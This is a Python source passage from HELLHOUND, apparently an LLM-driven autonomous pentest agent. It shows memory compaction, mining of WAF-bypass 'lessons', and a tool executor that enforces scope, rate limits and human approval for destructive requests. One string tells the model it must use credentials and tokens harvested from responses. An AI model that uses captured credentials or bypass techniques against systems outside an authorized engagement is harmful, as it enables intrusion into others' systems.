        The folded-out turns are then handed to a BACKGROUND thread for
        digest summarization + lesson mining, since those are LLM calls
        and must never block the response the researcher is waiting on.

        (An earlier version of this ran those two LLM calls inline, right
        before returning the answer. Once history passed the trigger,
        every turn paid for two sequential slow API calls before the
        researcher saw anything — a multi-hundred-second hang on what
        should've been an instant reply. That was the actual bug behind
        "still responding late." Fixed by making enrichment strictly
        best-effort and asynchronous — it can lag a turn or two behind
        without costing the researcher anything.)
        """
        if len(self.history) <= self._HISTORY_COMPACT_TRIGGER:
            return

        cutoff = len(self.history) - self._HISTORY_KEEP_RAW
        to_fold = self.history[:cutoff]
        remaining = self.history[cutoff:]
        if not to_fold:
            return

        # The size fix happens right here, synchronously — everything below
        # is enrichment and must not gate it.
        self.history = remaining

        if not self._compaction_lock.acquire(blocking=False):
            # A previous compaction pass is still running — skip this round
            # rather than piling up concurrent LLM calls. The next trigger
            # will pick up the newly-accumulated turns.
            return

        target = self.target  # snapshot — safe even if the target changes mid-flight

        def _worker():
            try:
                fold_text = self._render_turns_for_summary(to_fold)
                self._digest_from_text(fold_text, len(to_fold))
                target.state["session_digest"] = self.session_digest
                self._mine_lessons_from_text(fold_text, target=target)
                save_target(target)
            except Exception:
                pass  # best-effort background enrichment, never surfaces to the researcher
            finally:
                self._compaction_lock.release()

        threading.Thread(target=_worker, daemon=True, name="hellhound-compaction").start()

    def _finalize_target_lessons(self) -> None:
        """
        Called right before switching off the current target (see
        set_target) so a short session — one that never grows past
        _HISTORY_COMPACT_TRIGGER — still gets its lessons mined instead of
        losing them the moment the target changes. Runs in the background
        against a snapshot of the outgoing target/history, same reasoning
        as _compact_history_if_needed: switching targets must never wait
        on an LLM call.
        """
        if not self.target or len(self.history) < 4:
            return
        target = self.target
        history_snapshot = list(self.history)
        signature_snapshot = self._current_tech_signature()

        def _worker():
            try:
                fold_text = self._render_turns_for_summary(history_snapshot)
                self._mine_lessons_from_text(fold_text, target=target, tech_signature=signature_snapshot)
            except Exception:
                pass

        threading.Thread(target=_worker, daemon=True, name="hellhound-target-finalize").start()

    @staticmethod
    def _render_turns_for_summary(turns: List[Dict[str, str]]) -> str:
        """Bounded, plain-text rendering of history turns for feeding to a summarizer call."""
        FOLD_CHAR_BUDGET = 20000
        lines = []
        running = 0
        for h in turns:
            role = h.get("role", "user")
            content = str(h.get("content", ""))[:2000]
            line = f"[{role}] {content}"
            running += len(line)
            if running > FOLD_CHAR_BUDGET:
                break
            lines.append(line)
        return "\n".join(lines)

    def _digest_from_text(self, fold_text: str, folded_count: int) -> None:
        """Updates self.session_digest from a block of older turns being folded out of raw history."""
        summarizer_prompt = f"""\
Condense these older turns from an ongoing bug-bounty session into an \
updated rolling memory digest. Merge with the EXISTING DIGEST below rather \
than discarding it — this digest is the agent's only memory of anything \
older than its last few turns.

Keep, tersely (a few short bullet points, not a report):
- What's actually been tried against this target (tools/approaches used).
- Confirmed findings or successes.
- Explicit failures / dead ends — approaches that did NOT work and should \
NOT be retried.
- Any outstanding leads not yet resolved.

Drop small talk, greetings, and anything not useful to remember later.

EXISTING DIGEST:
{self.session_digest or "(none yet)"}

OLDER TURNS TO FOLD IN:
{fold_text}

Return ONLY the updated digest text — no preamble, no headers."""

        updated = None
        try:
            updated, _ = ask_neural_core(
                prompt=summarizer_prompt,
                system_prompt="You compress agent conversation history into terse rolling memory notes. Output only the digest text, nothing else.",
                role="compactor",
                thinking=False,
                max_tokens=400,
                return_usage=True,
            )
        except Exception:
            updated = None

        if updated and isinstance(updated, str) and not updated.startswith("Error:"):
            self.session_digest = updated.strip()[: self._DIGEST_CHAR_CAP]
        else:
            fallback_note = f"[{folded_count} earlier turns condensed — summarization unavailable this pass, details not preserved]"
            self.session_digest = ((self.session_digest or "").strip() + "\n" + fallback_note).strip()[: self._DIGEST_CHAR_CAP]

    def _mine_lessons_from_text(self, turns_text: str, target: Optional[Target] = None, tech_signature: Optional[List[str]] = None) -> None:
        """
        Extracts generalizable (technique, tech_signature, outcome, note)
        lessons from a block of turns and writes them to the global,
        cross-target lessons store (hellhound/memory/lessons.py). This is
        the closest thing to "self-learning" available without being able
        to fine-tune the underlying cloud model — instead of retraining
        weights, HELLHOUND keeps its own external notes and re-reads the
        relevant ones next time a similar-looking target shows up (see
        find_relevant_lessons, injected into the orchestrator prompt).

        `target` and `tech_signature` are accepted explicitly (rather than
        always reading self.target / self._current_tech_signature()) because
        this runs on a background thread — by the time it executes, the
        researcher may already have switched targets on the main thread, and
        reading self.target here would silently attribute the outgoing
        target's lessons to the new one. Callers snapshot both before
        spawning the thread; only compaction (same target throughout) omits
        them and gets the live values.

        Best-effort and silent on failure: a target this generic prompt
        can't extract anything meaningful from should not add noise to the
        store, and a malformed/empty model response should never break the
        turn that triggered this.
        """
        if not turns_text.strip():
            return

        target = target or self.target
        current_sig = tech_signature if tech_signature is not None else self._current_tech_signature()
        mining_prompt = f"""\
From these bug-bounty session turns, extract any GENERALIZABLE lessons — \
things worth remembering on a DIFFERENT target with a similar tech stack, \
not facts specific only to this one target (skip this target's own \
hostnames/IPs/tokens/credentials — those never apply elsewhere).

A lesson is a (technique, outcome) pair, e.g.: a bypass technique that \
worked against a particular WAF/framework, a payload class that got \
blocked/rate-limited on a particular stack, an auth pattern that was a \
dead end, a header trick that succeeded. Only extract things with a clear \
worked/failed outcome — skip anything inconclusive.

Tag each lesson with BOTH kinds of tags in tech_signature: the stack it was \
tried against (framework/language/CMS/WAF, e.g. "laravel", "nodejs", \
"cloudflare") AND the vulnerability/technique class it belongs to (e.g. \
"idor", "sqli", "ssrf", "auth-bypass", "jwt", "xxe", "graphql", \
"rate-limit-bypass", "parameter-pollution"). This lets a future target match \
on either "same stack" or "same class of bug", even when the stack differs.

CURRENT TARGET'S KNOWN TECH TAGS (attach relevant ones per lesson, add more \
specific ones — including a vuln-class tag — if evident from the turns): \
{", ".join(current_sig) or "(none known yet)"}

TURNS:
{turns_text}

Return ONLY a JSON array (no other text), each item shaped exactly like:
{{"technique": "short description of the approach", "outcome": "worked" or \
"failed", "tech_signature": ["stack-tag", "vuln-class-tag"], "note": "one \
short sentence of context, e.g. why it failed or what made it work"}}

If there is nothing worth generalizing, return an empty array: []"""

        try:
            raw, _ = ask_neural_core(
                prompt=mining_prompt,
                system_prompt="You extract structured, reusable lessons from a pentest session. Output ONLY a raw JSON array, nothing else — no markdown fences, no commentary.",
                role="compactor",
                thinking=False,
                max_tokens=600,
                return_usage=True,
            )
        except Exception:
            raw = None

        if not raw or not isinstance(raw, str) or raw.startswith("Error:"):
            return

        candidate = raw.strip()
        # Strip an accidental markdown fence — models do this even when told not to.
        if candidate.startswith("```"):
            candidate = re.sub(r"^```(?:json)?\s*|\s*```$", "", candidate.strip(), flags=re.IGNORECASE)

        try:
            parsed = json.loads(candidate)
        except Exception:
            return
        if not isinstance(parsed, list):
            return

        for item in parsed[:15]:  # sane per-pass ceiling
            if not isinstance(item, dict):
                continue
            technique = item.get("technique")
            outcome = item.get("outcome")
            if not technique or outcome not in ("worked", "failed"):
                continue
            sig = item.get("tech_signature") or current_sig
            add_lesson(
                technique=str(technique),
                outcome=str(outcome),
                tech_signature=sig,
                note=str(item.get("note", "")),
                target_name=target.name if target else "",
            )

    @staticmethod
    def _build_native_tools() -> List[Dict[str, Any]]:
        """Convert TOOL_REGISTRY specs into OpenAI-compatible tool definitions for native API tool calling."""
        tools = []
        for name, spec in TOOL_REGISTRY.items():
            tools.append({
                "type": "function",
                "function": {
                    "name": name,
                    "description": spec.description[:200],  # Keep descriptions concise for token efficiency
                    "parameters": spec.parameters or {"type": "object", "properties": {}}
                }
            })
        return tools

    def set_target(self, target_name: str) -> Target:
        self._finalize_target_lessons()  # mine lessons from the outgoing target before its history is replaced
        self.target = create_or_load_target(target_name)
        self.history = self.target.state.get("history") or []
        if not isinstance(self.history, list):
            self.history = []
        # Digest is per-target too — a fresh target starts with none, a
        # revisited target picks its own digest back up, never the
        # previous target's.
        self.session_digest = self.target.state.get("session_digest") or ""
        self._turn_path_scope = None  # Reset path scope to prevent bleeding from previous target
        self.guard = AutopilotGuard(  # Reset circuit breaker and rate limiters for the new target
            circuit_threshold=5,
            circuit_cooldown=60.0,
            recon_rps=10.0,
            test_rps=1.0,
            safe_methods_only=True
        )
        return self.target

    @property
    def _display_host(self) -> str:
        """
        The real, connectable host[:port] for the current target — for
        anything that builds an actual URL or compares against a live
        request's netloc. `self.target.name` is the filesystem-safe folder
        name (colons mangled to underscores by sanitize_target_name) and
        must NEVER be used for that; "192.168.1.5:8080" as a folder name is
        "192.168.1.5_8080", which is not a resolvable hostname. Falls back
        to `.name` only for targets set before this field existed.
        """
        if not self.target:
            return "default"
        return self.target.host or self.target.name

    def _current_tech_signature(self) -> List[str]:
        """
        Best-effort tags describing this target, for matching against the
        cross-target lessons store — covers BOTH axes a lesson can match
        on: the tech stack (fingerprinted technologies + hostname tokens)
        and the vulnerability/technique classes already active on this
        target (finding types + anything dismissed as a false positive, so
        "we already ruled out IDOR here" also pulls IDOR-tagged lessons).
        Never invented — on a completely fresh target this may return very
        little or nothing, and find_relevant_lessons() falls back
        gracefully to general lessons in that case.
        """
        tags = []
        techs = self.target.state.get("technologies") or []
        for t in techs:
            tags.append(str(t))
        host = self._display_host or ""
        host_tokens = re.split(r"[.\-_/:]+", host.lower())
        tags.extend(tok for tok in host_tokens if len(tok) > 2 and tok not in ("www", "com", "net", "org", "http", "https"))

        # Vuln-class tags: what's already been found or actively ruled out
        # on this target, so lessons tagged by technique class (idor, sqli,
        # ssrf, auth-bypass, ...) surface even when the stack itself is new.
        findings = self.target.findings if isinstance(self.target.findings, list) else []
        for f in findings:
            ftype = f.get("type") if isinstance(f, dict) else f
            if ftype:
                tags.append(str(ftype).strip().lower())
        for d in (self.target.state.get("dismissed_false_positives") or []):
            item = d.get("item") if isinstance(d, dict) else d
            if item:
                tags.append(str(item).strip().lower())

        return tags

    def _get_trimmed_history(self, max_turns: int = 6, for_chat: bool = False, turn_start_idx: Optional[int] = None) -> List[Dict[str, str]]:
        """
        Returns a sanitized history window for LLM/SLM prompts.
        If turn_start_idx is provided, ALL tool results and assistant turns executed in the
        current turn are preserved intact so the orchestrator and synthesizer have complete
        visibility of what tools produced during this run.
        """
        if not self.history:
            return []

        if for_chat:
            chat_turns = []
            for h in reversed(self.history):
                content = str(h.get("content", ""))
                # Skip heavy reports, tool outputs, session summaries, and lengthy blocks
                if (
                    "[TOOL RESULT:" in content
                    or "ALWAYS-ON" in content
                    or "Session Summary" in content
                    or len(content) > 350
                ):
                    continue
                chat_turns.insert(0, {"role": h.get("role", "user"), "content": content.strip()})
                if len(chat_turns) >= max_turns:
                    break
            return chat_turns

        if turn_start_idx is not None and 0 <= turn_start_idx <= len(self.history):
            # Split into prior conversation history and current-turn activity
            prior_history = self.history[:turn_start_idx]
            current_turn_history = self.history[turn_start_idx:]
            # Keep up to max_turns of prior conversational context
            recent_prior = prior_history[-max_turns:] if len(prior_history) > max_turns else prior_history

            # Per-message truncation below (25k tool-result cap, 4k general cap)
            # bounds each entry individually, but current_turn_history has no
            # cap on *count* — a long recon/attack turn (max_agent_iterations
            # up to 60) can rack up 15-20+ tool calls, each up to 25k chars,
            # before synthesis. That can balloon the synthesizer request past
            # 200-400k chars, which on a cloud model either takes minutes to
            # get a first streamed token or effectively hangs the SSE read
            # with zero visibility (looked like "AI not responding" — it was
            # actually just buried under a request curl-sized tests never hit).
            # Cap the current-turn window itself: keep the most recent entries
            # that fit a total char budget, drop older ones with a note so the
            # synthesizer still knows work happened before the window.
            CURRENT_TURN_CHAR_BUDGET = 60000
            if current_turn_history:
                kept_rev = []
                running_total = 0
                dropped = 0
                for h in reversed(current_turn_history):
                    entry_len = len(str(h.get("content", "")))
                    if kept_rev and running_total + entry_len > CURRENT_TURN_CHAR_BUDGET:
                        dropped += 1
                        continue
                    kept_rev.append(h)
                    running_total += entry_len
                current_turn_history = list(reversed(kept_rev))
                if dropped:
                    current_turn_history.insert(0, {
                        "role": "user",
                        "content": f"[NOTE: {dropped} earlier tool call(s)/message(s) from this turn were omitted "
                                    f"here to keep the request size sane. Full outputs remain saved under "
                                    f"~/.hellhound/targets/<target>/raw/ if needed.]"
                    })

            combined = recent_prior + current_turn_history
        else:
            combined = self.history[-max_turns:] if len(self.history) > max_turns else self.history

        trimmed = []
        for h in combined:
            content = str(h.get("content", ""))
            is_tool_result = content.startswith("[TOOL RESULT:")
            if is_tool_result:
                # Tool results (curl bodies, spider intel, JSON feeds) are the
                # highest-value content — provide full results up to 25,000 characters
                # so the LLM can extract tokens, IDs, endpoints, and credentials without loss.
                if len(content) > 25000:
                    artifacts_prefix = _extract_preserved_artifacts(content)

                    target_name = self.target.name if (hasattr(self, "target") and self.target and hasattr(self.target, "name") and self.target.name) else "default"
                    tool_match = re.search(r"\[TOOL RESULT:\s*([a-zA-Z0-9_-]+)\]", content)
                    tool_name = tool_match.group(1) if tool_match else "tool_output"

                    saved_msg = ""
                    try:
                        raw_dir = os.path.expanduser(f"~/.hellhound/targets/{target_name}/raw")
                        os.makedirs(raw_dir, exist_ok=True)
                        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
                        filename = f"{tool_name}_{timestamp}.txt"
                        saved_path = os.path.join(raw_dir, filename)

                        with open(saved_path, "w", encoding="utf-8", errors="replace") as f:
                            f.write(content)

                        char_count = len(content)
                        line_count = len(content.splitlines())
                        saved_msg = f"\n[FULL OUTPUT SAVED: {saved_path} — {char_count:,} chars, {line_count:,} lines. Use read_artifact(path=..., offset=..., length=...) if you need a section not shown above.]"
                    except Exception:
                        pass

                    head = content[:12000]
                    tail = content[-8000:]
                    truncated_len = len(content) - 12000 - 8000
                    middle_marker = f"\n...[{truncated_len:,} chars truncated from middle]...\n"

                    content = artifacts_prefix + head + middle_marker + tail + saved_msg
            elif len(content) > 4000:
                content = content[:3800] + "\n...[truncated]..."
            trimmed.append({"role": h.get("role", "user"), "content": content})
        return trimmed

    @staticmethod
    def _describe_host_mismatch(active_host: str, cand_host: str) -> str:
        """
        Two hosts that differ by one small drifted token (a stray inserted
        segment, a duplicated octet, etc.) look nearly identical sitting
        side by side in a wall of log text — the actual difference is easy
        to miss even though it's a completely different host. Call out
        exactly what changed instead of just repeating both full strings.
        """
        sm = difflib.SequenceMatcher(None, active_host, cand_host)
        inserted, deleted = [], []
        for tag, i1, i2, j1, j2 in sm.get_opcodes():
            if tag == "insert":
                inserted.append(cand_host[j1:j2])
            elif tag == "delete":
                deleted.append(active_host[i1:i2])
            elif tag == "replace":
                deleted.append(active_host[i1:i2])
                inserted.append(cand_host[j1:j2])
        if sm.ratio() > 0.6 and (inserted or deleted):
            bits = []
            if inserted:
                bits.append(f"an extra '{''.join(inserted)}'")
            if deleted:
                bits.append(f"missing '{''.join(deleted)}'")
            return f"looks like the real target with {' and '.join(bits)} — not the same host"
        return "a completely different host"

    def _extract_target_from_args(self, args: Dict[str, Any]) -> str:
        for key in ("domain", "domains", "target", "url", "subdomain", "subdomains", "host", "hosts", "candidates", "request_ref"):
            if key in args and args[key]:
                val = args[key]
                if isinstance(val, list) and val:
                    return str(val[0])
                if isinstance(val, str) and "," in val:
                    return str(val.split(",")[0].strip())
                return str(val)
        return self._display_host

    def execute_tool_call(self, tool_name: str, args: Any, emit: Any = None) -> Dict[str, Any]:
        """
        Executes a tool with hard code-level scope validation, safe method policy,
        circuit breaker checking, and rate-limiting pacing.
        """
        if not isinstance(args, dict):
            if isinstance(args, str):
                try:
                    parsed = json.loads(args)
                    args = parsed if isinstance(parsed, dict) else {"input": args}
                except Exception:
                    args = {"input": args}
            else:
                args = {}

        spec = TOOL_REGISTRY.get(tool_name)
        if not spec:
            return {"error": f"Tool '{tool_name}' not found in registry."}

        # Internal memory & finding recording tools operate locally on target state
        if tool_name in ("record_finding", "search_findings", "dismiss_finding", "export_report", "view_evidence", "get_investigation_graph", "ask_memory", "plan_next_steps"):
            return spec.executor(args, self.target, emit)

        target_candidate = self._extract_target_from_args(args)

        # 1. Enforce code-level Scope Gate
        if self.target and self.target.scope_rules and self.target.scope_rules.in_scope:
            allowed, reason = is_in_scope(target_candidate, self.target.scope_rules)
            if not allowed:
                msg = f"[!] not doing that — {reason}"
                if emit and hasattr(emit, "warn"):
                    emit.warn(msg)
                return {
                    "error": f"SCOPE_VIOLATION: {reason}",
                    "target": target_candidate,
                    "blocked": True
                }
        elif self.target and self.target.name and target_candidate and tool_name != "run_terminal_command":
            # No explicit /scope in_scope list has been configured (the
            # researcher just said "your target is X" in plain chat). That
            # is NOT an invitation to test anything the model decides to —
            # it should still mean exactly one host. Pin every tool call's
            # target to the active target's own host so a hallucinated or
            # garbled URL (a real observed failure mode: the model inventing
            # a URL that superficially resembles the target but isn't it)
            # can't silently reach a completely different host.
            #
            # IMPORTANT: compare against target.host (the real, connectable
            # host[:port] — see extract_raw_host()), never target.name.
            # target.name is the filesystem-safe folder name and mangles
            # ":" to "_" (e.g. "10.49.182.225:5000" -> "10.49.182.225_5000"),
            # which normalize_host() would then read back as a bogus
            # hostname — blocking every legitimate call against the real
            # target. This was caught in review: it broke the very first
            # request in a live session.
            active_reference = self.target.host or self.target.name
            active_host, _ = normalize_host(active_reference)
            cand_host, _ = normalize_host(target_candidate)
            if active_host and cand_host and active_host != cand_host and not cand_host.endswith("." + active_host):
                mismatch = self._describe_host_mismatch(active_host, cand_host)
                msg = (
                    f"[!] not doing that — '{cand_host}' {mismatch} "
                    f"(active target is '{active_host}'). If '{cand_host}' is really a second host "
                    f"you want tested, set it with /scope first."
                )
                if emit and hasattr(emit, "warn"):
                    emit.warn(msg)
                return {
                    "error": (
                        f"SCOPE_VIOLATION: '{cand_host}' {mismatch} (active target: '{active_host}'). "
                        f"No /scope is configured to authorize a second host — retry against the active "
                        f"target's actual host, or ask the user to confirm/add the new one via /scope."
                    ),
                    "target": target_candidate,
                    "blocked": True
                }

        # 1b. Enforce per-turn path scope (when a task is scoped to a specific
        # base path, tool calls must not wander into sibling applications on the same host).
        if self._turn_path_scope and tool_name not in ("run_terminal_command", "record_finding", "export_report"):
            url_candidate = args.get("url") or args.get("request_ref")
            if url_candidate and str(url_candidate).startswith(("http://", "https://", "/")):
                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                    # Auto-correct URL if it targeted the active host but omitted the path scope prefix
                    parsed = urlparse(str(url_candidate))
                    clean_scope = "/" + self._turn_path_scope.strip("/.,;:!?)>\"'")
                    if parsed.scheme and parsed.netloc:
                        if self._display_host in parsed.netloc or parsed.netloc in self._display_host:
                            new_path = f"{clean_scope}{parsed.path}"
                            new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                            if parsed.query:
                                new_url += f"?{parsed.query}"
                            if args.get("url"):
                                args["url"] = new_url
                            if args.get("request_ref"):
                                args["request_ref"] = new_url
                            url_candidate = new_url
                            if emit and hasattr(emit, "info"):
                                emit.info(f"Auto-scoped URL to active lab path: {new_url}")
                    elif str(url_candidate).startswith("/"):
                        new_path = f"{clean_scope}{url_candidate}"
                        if args.get("url"):
                            args["url"] = new_path
                        if args.get("request_ref"):
                            args["request_ref"] = new_path
                        url_candidate = new_path
                        if emit and hasattr(emit, "info"):
                            emit.info(f"Auto-scoped URL to active lab path: {new_path}")

                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                    reason = (
                        f"Requested URL '{url_candidate}' is outside the active path scope ('{self._turn_path_scope}'). "
                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self._display_host}{self._turn_path_scope}/dashboard' or 'https://{self._display_host}{self._turn_path_scope}/api/...'). "
                        f"Do NOT send requests to out-of-scope paths."
                    )
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"[!] PATH SCOPE REFUSAL: {url_candidate} — {reason}")
                    return {
                        "error": f"PATH_SCOPE_VIOLATION: {reason}",
                        "target": str(url_candidate),
                        "blocked": True
                    }

        # 2. Check for disallowed module flags
        if self.target and self.target.scope_rules:
            allowed, reason = check_module_against_rules(tool_name, self.target.scope_rules)
            if not allowed:
                return {
                    "error": f"RULE_VIOLATION: {reason}",
                    "blocked": True
                }

        # 2b. Enforce Artifact Pre-Flight Gate (Block redundant discovery when unconsumed artifacts exist)
        if tool_name in DISCOVERY_TOOLS:
            gate_result = check_artifact_preflight_gate(tool_name, args, self.target, getattr(self, "history", []))
            if gate_result:
                if emit and hasattr(emit, "warn"):
                    emit.warn(f"[!] ARTIFACT PRE-FLIGHT GATE: Blocked '{tool_name}' — unconsumed security artifact requires testing first.")
                return gate_result

        # 3. Autopilot Guard (CircuitBreaker + SafeMethodPolicy)
        method = str(args.get("method", "GET")).upper()
        url = args.get("url") or (target_candidate if target_candidate.startswith(("http://", "https://")) else f"https://{target_candidate}")
        guard_result = self.guard.check_request(method, url)

        if guard_result.get("decision") == "block":
            reason = guard_result.get("reason", "Target host blocked by circuit breaker")
            if emit and hasattr(emit, "warn"):
                emit.warn(f"[!] GUARD BLOCKED: {reason}")
            return {"error": f"blocked: {reason}", "blocked": True}

        if guard_result.get("decision") == "require_approval":
            reason = guard_result.get("reason", "Method requires human approval")
            approved = False

            if emit and hasattr(emit, "request_approval"):
                # GUI (or any other emit implementation) that can actually
                # surface a blocking approve/deny prompt outside a TTY.
                try:
                    approved = bool(emit.request_approval(tool_name, method, url, reason))
                except Exception:
                    approved = False

                if approved:
                    if hasattr(emit, "success"):
                        emit.success(f"Action authorized by user — executing {tool_name}")
                else:
                    if hasattr(emit, "warn"):
                        emit.warn(f"Action rejected by user — blocked {tool_name}")
                    return {
                        "error": f"Action rejected by user: {reason}. The destructive request '{method} {url}' was NOT executed.",
                        "blocked": True,
                        "approval_denied": True
                    }

            # Check if interactive session with stdin attached
            elif sys.stdin and sys.stdin.isatty():
                was_running = False
                if emit:
                    if hasattr(emit, "stop_indicator"):
                        emit.stop_indicator()
                        was_running = True
                    elif hasattr(emit, "stop"):
                        emit.stop()
                        was_running = True

                print("\n")
                try:
                    from rich.console import Console
                    from rich.panel import Panel
                    _c = Console()
                    _c.print(Panel(
                        f"[bold yellow]Tool:[/bold yellow] [white]{tool_name}[/white]\n"
                        f"[bold yellow]Action:[/bold yellow] [bold red]{method}[/bold red] [white]{url}[/white]\n"
                        f"[bold yellow]Reason:[/bold yellow] [white]{reason}[/white]",
                        title="[bold red] ⚠️  GUARD APPROVAL REQUIRED [/bold red]",
                        border_style="bold red",
                        expand=False
                    ))
                except Exception:
                    print(f" [!] GUARD APPROVAL REQUIRED: {reason}")
                    print(f" [!] Tool: {tool_name} | Action: {method} {url}")

                try:
                    ans = input(" \033[1;33m[?] Authorize this destructive action? [y/N]:\033[0m ").strip().lower()
                    approved = ans in ("y", "yes")
                except (KeyboardInterrupt, EOFError):
                    approved = False

                if was_running and emit:
                    if hasattr(emit, "restart_indicator"):
                        emit.restart_indicator()
                    elif hasattr(emit, "start"):
                        emit.start()

                if approved:
                    if emit and hasattr(emit, "success"):
                        emit.success(f"Action authorized by user — executing {tool_name}")
                else:
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"Action rejected by user — blocked {tool_name}")
                    return {
                        "error": f"Action rejected by user: {reason}. The destructive request '{method} {url}' was NOT executed.",
                        "blocked": True,
                        "approval_denied": True
                    }
            else:
                if emit and hasattr(emit, "warn"):
                    emit.warn(f"[!] GUARD APPROVAL REQUIRED: {reason} (non-interactive session)")
                return {
                    "error": f"requires human approval (non-interactive session): {reason}",
                    "requires_approval": True,
                    "blocked": True
                }

        # 4. Rate Limiter (Pacing)
        is_recon = tool_name in ("subfinder", "dns_bruteforce", "httpx", "dig", "subzy", "vhost_fuzz", "gowitness")
        host = self.guard._extract_host(url)
        self.guard._limiter.wait(host, is_recon=is_recon)

        # 5. Tool Execution & Circuit Breaker status tracking
        try:
            result = spec.executor(args, self.target, emit)
            if isinstance(result, dict) and result.get("error"):
                self.guard.record_failure(host)
            else:
                self.guard.record_success(host)

            # Mark consumed artifacts if this tool tested/submitted any discovered tokens or credentials
            try:
                mark_consumed_artifacts(tool_name, args, self.target)
            except Exception:
                pass

            # Auto-extract & persist harvested security artifacts (tokens, passwords, session cookies, keys)
            try:
                harvested = extract_and_store_artifacts(tool_name, args, result, self.target, turn_number=getattr(self, "_current_turn", len(self.history)))
                if harvested and isinstance(result, dict):
                    result["harvested_security_artifacts"] = harvested
                    if "LEAK_ALERT" not in result:
                        summary_str = ", ".join([f"{a.get('field_name')}='{a.get('value')}'" for a in harvested[:3]])
                        result["LEAK_ALERT"] = f"CRITICAL SECURITY FINDING: {len(harvested)} sensitive artifact(s) harvested from response ({summary_str}). You MUST analyze and use these credentials/tokens!"
            except Exception:
                pass

            return result
        except Exception as e:
            self.guard.record_failure(host)
            return {"error": f"Tool execution failed: {str(e)}"}

    def handle_message(self, user_text: str, session_context: Optional[Dict[str, Any]] = None, emit: Any = None, max_iterations: Optional[int] = None, on_token: Optional[Callable[[str], None]] = None, cancel_check: Optional[Callable[[], bool]] = None) -> str:
        """
        Main autonomous reasoning and conversational loop.
        """
        original_user_text = user_text
        if session_context:
            t_name = session_context.get("target") or session_context.get("target_name")
            if t_name and t_name != "default" and t_name != self.target.name:
                self.set_target(t_name)
            if session_context.get("scope_rules"):
                self.target.scope_rules = session_context["scope_rules"]

        # Check if there is a target defined in the prompt or active context
        target_match = extract_target_from_text(user_text)
        domain_match = target_match
        if target_match:
            detected_target = target_match
            # Compare sanitized forms — target_match is now the RAW host
            # (needed downstream to populate Target.host correctly), but
            # self.target.name is always the sanitized folder name. Comparing
            # raw-to-sanitized directly would mismatch on every single turn
            # even when the target hasn't changed, spuriously calling
            # set_target() each time and wiping path-scope/rate-limiter state
            # that should persist across the conversation.
            if self.target.name == "default" or (self.target.name != sanitize_target_name(detected_target)):
                self.set_target(detected_target)
        elif self.target.name == "default" and self.target.scope_rules.in_scope:
            primary_target = self.target.scope_rules.in_scope[0].lstrip("*.")
            if primary_target:
                self.set_target(primary_target)

        if session_context is not None:
            session_context["target"] = self.target.name
            session_context["scope_rules"] = self.target.scope_rules

        # Hard safety gate: if target is "default" with no scope, the orchestrator
        # has no valid domain/IP to hit — skip the tool loop entirely and let the
        # synthesizer handle it conversationally. The AI model itself decides
        # whether to use tools or just answer — no keyword classification needed.
        has_real_target = (
            (self.target.name != "default")
            or bool(target_match)
            or bool(self.target.scope_rules and self.target.scope_rules.in_scope)
        )

        # Code-level pre-gate: with an active target and prior session state
        # already loaded, a confidently-conversational message ("why did you
        # do that", "explain this deeper", "nice work!") was still entering
        # the full orchestrator loop and calling tools — the wall of
        # TARGET/SCOPE/session context outweighed the model's own judgment
        # more often than not. This is checked once, here, before the loop
        # below ever runs — not just requested inside its prompt.
        _skip_orchestrator_loop = has_real_target and _confidently_conversational(original_user_text)

        # Build System Prompt with registered tools and current target scope
        tools_summary = "\n".join([
            f"- {name}: {spec.description} | Params: {json.dumps(spec.parameters)}"
            for name, spec in TOOL_REGISTRY.items()
        ])

        scope_summary = "None (Default local allow)"
        if self.target.scope_rules.in_scope:
            scope_summary = f"IN-SCOPE: {self.target.scope_rules.in_scope} | OUT-OF-SCOPE: {self.target.scope_rules.out_scope}"

        # Dynamic Skill-Aware Reasoning Injection (for Synthesizer)
        cfg = load_config()
        ai_prov = (cfg.get("synthesizer_provider") or cfg.get("ai_provider") or "ollama").lower()
        is_small = (ai_prov == "ollama")

        # Who's actually on the other end of this conversation — set via
        # /handle. Previously only used for the CLI sign-off; the model
        # itself never saw it, so "who am I" / "who am I talking to" had no
        # way to be answered correctly even after the researcher set a handle.
        researcher_handle = (cfg.get("researcher_handle") or "").strip()
        researcher_line = (
            f"RESEARCHER: {researcher_handle} (set via /handle, saved to disk config — persists across sessions, not session-scoped)"
            if researcher_handle
            else "RESEARCHER: not set — they haven't run /handle <name> yet, so you don't have a name for them. "
                 "If asked, say plainly it's not set and that /handle <name> sets it. Once set it is saved to disk "
                 "config and persists across every future session — do NOT say it only lasts for this session, "
                 "and do NOT claim to remember something from a prior session you have no record of here."
        )

        # Iteration ceiling: explicit arg wins, else the configured value
        # (default 60 — see ai_utils.load_config), never below 1.
        if max_iterations is None:
            try:
                max_iterations = max(1, int(cfg.get("max_agent_iterations", 60)))
            except (TypeError, ValueError):
                max_iterations = 60

        forced_skill = getattr(self, "_forced_skill", None)
        was_forced_skill = bool(forced_skill)
        if forced_skill:
            forced_body = load_skill_body(forced_skill)
            if forced_body:
                skills_block = f"--- SKILL EXPLICITLY REQUESTED BY USER: {forced_skill} ---\n{forced_body}\n--- END REQUESTED SKILL ---"
            else:
                skills_block = get_relevant_skills_prompt(
                    user_text=user_text, history_len=len(self.history),
                    has_target=(self.target.name != "default"), is_small_model=is_small, max_skills=2
                )
            self._forced_skill = None  # one-shot: applies to this message only
        else:
            skills_block = get_relevant_skills_prompt(
                user_text=user_text, history_len=len(self.history),
                has_target=(self.target.name != "default"), is_small_model=is_small, max_skills=2
            )

        try:
            _all_skills = discover_skills()
            skills_menu = "\n".join(f"  - {n}: {s.description}" for n, s in sorted(_all_skills.items()))
        except Exception:
            skills_menu = "(skill menu unavailable)"

        def _get_orchestrator_system_prompt() -> str:
            path_scope_prompt = ""
            if self._turn_path_scope:
                path_scope_prompt = f"\nACTIVE LAB PATH SCOPE: '{self._turn_path_scope}' (ALL tool URLs MUST begin with 'https://{self._display_host}{self._turn_path_scope}/...'; root '/' and other paths are out of scope)\n"

            known_eps = (self.target.state.get("endpoints") or [])[:35]
            known_params = (self.target.state.get("spider_intel") or {}).get("parameters", [])[:15]
            known_creds = self.target.state.get("credentials") or (self.target.state.get("spider_intel") or {}).get("credentials", [])
